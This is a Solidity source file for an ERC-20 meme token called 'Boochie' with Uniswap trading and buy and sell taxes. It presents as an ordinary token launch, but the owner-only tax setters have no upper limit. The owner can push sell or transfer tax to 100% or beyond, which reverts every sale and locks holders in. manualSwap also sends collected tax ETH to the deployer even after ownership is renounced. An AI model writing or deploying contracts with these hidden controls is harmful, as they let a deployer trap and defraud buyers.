// SPDX-License-Identifier: MIT

/*
Description: Boochie, created by artist Matt Furie, is a character known for his expressiveness and emotional range.

Website: https://boochie.me/
Twitter: https://x.com/BoochieETH/
Telegram: https://t.me/+tVS-Wn-7qcNjZTUy/
*/

/*
                ,----..        ,----..                        ,--,
    ,---,.     /   /   \      /   /   \     ,----..         ,--.'|    ,---,     ,---,.
  ,'  .'  \   /   .     :    /   .     :   /   /   \     ,--,  | : ,`--.' |   ,'  .' |
,---.' .' |  .   /   ;.  \  .   /   ;.  \ |   :     : ,---.'|  : ' |   :  : ,---.'   |
|   |  |: | .   ;   /  ` ; .   ;   /  ` ; .   |  ;. / |   | : _' | :   |  ' |   |   .'
:   :  :  / ;   |  ; \ ; | ;   |  ; \ ; | .   ; /--`  :   : |.'  | |   :  | :   :  |-,
:   |    ;  |   :  | ; | ' |   :  | ; | ' ;   | ;     |   ' '  ; : '   '  ; :   |  ;/|
|   :     \ .   |  ' ' ' : .   |  ' ' ' : |   : |     '   |  .'. | |   |  | |   :   .'
|   |   . | '   ;  \; /  | '   ;  \; /  | .   | '___  |   | :  | ' '   :  ; |   |  |-,
'   :  '; |  \   \  ',  /   \   \  ',  /  '   ; : .'| '   : |  : ; |   |  ' '   :  ;/|
|   |  | ;    ;   :    /     ;   :    /   '   | '/  : |   | '  ,/  '   :  | |   |    \
|   :   /      \   \ .'       \   \ .'    |   :    /  ;   : ;--'   ;   |.'  |   :   .'
|   | ,'        `---`          `---`       \   \ .'   |   ,/       '---'    |   | ,'
`----'                                      `---`     '---'                 `----'
*/

// solidity version declaration
pragma solidity 0.8.20;

/** Default functions **/
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/** Uniswap pair creation **/
interface IUniswapV2Factory {
    /* Creates a new liquidity pool (pair) for the two specified ERC-20 tokens `tokenA` and `tokenB`.
    Returns the address of the newly created pair contract */
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

/** Uniswap pair swap **/
interface IUniswapV2Router02 {
    /* Swaps an exact amount of input tokens for as much ETH as possible, supporting tokens that take fees on transfers */
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    /* Returns the address of the Uniswap factory contract.
    The factory contract is responsible for creating and managing the liquidity pools (pairs) */
    function factory() external pure returns (address);
    /* Returns the address of the Wrapped Ether (WETH) contract.
    WETH is used within Uniswap to represent Ether in ERC-20 form */
    function WETH() external pure returns (address);
}

/** Math operations with checks **/
library SafeMath {
    /* Addition */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /* Subtraction */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    /* Multiplication */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /* Division */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

/** Processes data received from the block **/
abstract contract Context {
    /* Returns the address of the sender of the transaction */
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

/** Processes logic related to contract ownership **/
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /* When creating a contract, makes the sender's address the owner */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /* When added to function, allows only the owner of the contract to call the function */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /* Returns the address of the contract owner (deployer) */
    function owner() public view returns (address) {
        return _owner;
    }

    /* Renounce of ownership of the contract.
    Calling functions available only to the owner is no longer possible. Note: only owner can call this function */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

/** Processes main contract logic **/
contract Boochie is Context, IERC20, Ownable {
    using SafeMath for uint256; // math lib connection
    mapping (address => uint256) private _balances; // list of addresses and their balances | _balances[address] = addressBalance
    mapping (address => mapping (address => uint256)) private _allowances; // nested list of allowances and their balances | _allowances[owner][spender] = spenderAllowance
    mapping (address => bool) private _isExcludedFromFee; // list of excluded from fee addresses | _isExcludedFromFee[address] = whitelistedAddress
    address payable private _taxWallet; // address for taxes

    uint256 private _transferTax = 0; // tax for transfers
    uint256 private _initialBuyTax = 30; // buy tax when '_buyCount' variable is Less than '_reduceBuyTaxAt' constant
    uint256 private _initialSellTax = 30; // sell tax when '_buyCount' variable is Less than '_reduceSellTaxAt' constant
    uint256 private _finalBuyTax = 0; // buy tax when '_buyCount' variable is Greater than '_reduceBuyTaxAt' constant
    uint256 private _finalSellTax = 0; // sell tax when '_buyCount' variable is Greater than '_reduceSellTaxAt' constant
    uint256 private _reduceBuyTaxAt = 300; // number of purchases required to reduce buy tax
    uint256 private _reduceSellTaxAt = 300; // number of purchases required to reduce sell tax
    uint256 private _preventSwapBefore = 20; // prevents tax swap up to a specified number of purchases
    uint256 private _buyCount = 0; // buy transactions count

    string private constant _name = unicode"Boochie";
    string private constant _symbol = unicode"BOOCHIE"; // ticker
    uint8 private constant _decimals = 18; // number of decimal places for the token
    uint256 private constant _totalSupply = 100_000_000 * 10**_decimals; // 100m (all)
    uint256 public _maxTxAmount = 1_000_000 * 10**_decimals; // 1m (1%) | maximum buy transaction amount
    uint256 public _maxWalletSize = 2_000_000 * 10**_decimals; // 2m (2%)
    uint256 public _taxSwapThreshold = 500_000 * 10**_decimals; // 500k (0.5%) | tax swap will be triggered after tax amount is larger than it
    uint256 public _maxTaxSwap = 1_000_000 * 10**_decimals; // 1m (1%) | max tokens amount to swap in one transaction
    event MaxTxAmountUpdated(uint _maxTxAmount);

    IUniswapV2Router02 private uniswapV2Router; // declares a variable `uniswapV2Router` of type `IUniswapV2Router02` (has all the methods listed in the interface)
    address private uniswapV2Pair; // a variable in which, when a pair is created, its address is written
    bool private inSwap = false; // 'true' during taxes swap transaction processing, otherwise 'false'
    bool private swapEnabled = false; // allows tax swap when 'true'

    /* Called when creating a contract */
    constructor () {
        _taxWallet = payable(_msgSender()); // taxes go to the address of the contract deployer
        _balances[_msgSender()] = _totalSupply; // contract deployer receives all tokens on his balance
        _isExcludedFromFee[owner()] = true; // contract address is added to the whitelist
        _isExcludedFromFee[_taxWallet] = true; // contract address is added to the whitelist
        _isExcludedFromFee[address(this)] = true; // contract deployer address is added to the whitelist
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /* When added to function, prevents two simultaneous taxes swap */
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    /* Changes transfer tax. Note: only owner can call this function */
    function setTransferTax(uint256 newTransferTax) public onlyOwner returns (bool) {
        _transferTax = newTransferTax;
        return true;
    }

    /* Changes initial buy tax. Note: only owner can call this function */
    function setInitialBuyTax(uint256 newInitialBuyTax) public onlyOwner returns (bool) {
        _initialBuyTax = newInitialBuyTax;
        return true;
    }

    /* Changes initial sell tax. Note: only owner can call this function */
    function setInitialSellTax(uint256 newInitialSellTax) public onlyOwner returns (bool) {
        _initialSellTax = newInitialSellTax;
        return true;
    }

    /* Adds the specified address to the whitelist. Note: only owner can call this function */
    function addToWhitelist(address newAddress) public onlyOwner returns (bool) {
        _isExcludedFromFee[newAddress] = true;
        return true;
    }

    /* Returns the transfer tax value */
    function transferTax() public view  returns (uint256) {
        return _transferTax;
    }

    /* Returns the initial buy tax value */
    function initialBuyTax() public view returns (uint256) {
        return _initialBuyTax;
    }

    /* Returns the initial sell tax value */
    function initialSellTax() public view  returns (uint256) {
        return _initialSellTax;
    }

    /* Returns the name of the contract */
    function name() public pure returns (string memory) {
        return _name;
    }

    /* Returns the ticker */
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    /* Returns the '_decimals' variable value */
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    /* Returns the total supply value */
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    /* Returns the balance value of the specified address */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /* Returns the amount of tokens that 'spender' is currently allowed to withdraw from 'owner'
    account using the 'transferFrom' function. */
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    /* Transfers 'amount' tokens from the sender to 'recipient'. Calls the '_transfer' function containing the main logic */
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /* Allows 'spender' to spend 'amount' tokens on behalf of the sender. Calls the '_approve' function containing the main logic */
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /* Allows 'recipient' to spend 'amount' tokens on behalf of 'sender'
    and transfers 'amount' tokens from the 'sender' to 'recipient'.
    Calls the '_transfer' and '_approve' functions containing the main logic */
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    /* Allows 'spender' to spend 'amount' tokens on behalf of the sender */
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /* Sends ETH tax to '_taxWallet' */
    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    /* Compares two numbers and returns the smallest */
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    /* Transfers 'amount' tokens from the sender to 'recipient' */
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;

        // from == uniswapV2Pair: Buy
        // to == uniswapV2Pair: Sell
        if (from != owner() && to != owner()) {
            if (_buyCount == 0) {
                taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100); // buy tax
            }
            if (_buyCount > 0) {
                taxAmount = amount.mul(_transferTax).div(100); // transfer tax
            }

            // any buy with tax will increase '_buyCount' by 1
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100); // buy tax
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100); // sell tax
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                contractTokenBalance > _taxSwapThreshold &&
                _buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap))); // swap token-tax for ETH (max: '_maxTaxSwap')
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance); // send tax ETH to '_taxWallet'
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount); // add token-tax to contract balance
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount); // remove 'amount' from sender balance
        _balances[to] = _balances[to].add(amount.sub(taxAmount)); // add 'amount' minus 'tax' to recipient balance
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    /* Changes tokens for ETH. Note: 'lockTheSwap' prevents two simultaneous taxes swap */
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2); // array with length = 2
        path[0] = address(this); // first pair element: token address
        path[1] = uniswapV2Router.WETH(); // second pair element: WETH address
        _approve(address(this), address(uniswapV2Router), tokenAmount); // allows uniswap to spend (exchange) 'tokenAmount' on behalf of contract
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        ); // swap tokens for ETH
    }

    /* Removes limitations to maximum buy transaction amount and to maximum wallet size.
    Note: only owner can call this function */
    function removeLimits() external onlyOwner {
        _maxTxAmount = _totalSupply;
        _maxWalletSize = _totalSupply;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    /* Creates a pair and enables trading. Note: only owner can call this function */
    function openTrading() external onlyOwner() {
        // mainNet address: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // creates uniswap router instance
        _approve(address(this), address(uniswapV2Router), _totalSupply); // allows uniswap to manage total supply on behalf of contract
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH()); // creates pair 'token/WETH'
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); // #
        swapEnabled = true; // allow tax swap
    }

    /* Manual swap tokens-tax to ETH. Note: in this case, tax swap limits do not apply */
    function manualSwap() external {
        require(_msgSender() == _taxWallet); // only '_taxWallet' address (owner) can call this function; note: will still work after renounce
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance); // swap token-tax for ETH
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance); // send ETH to '_taxWallet'
        }
    }

    // contract can receive ETH
    receive() external payable {}
}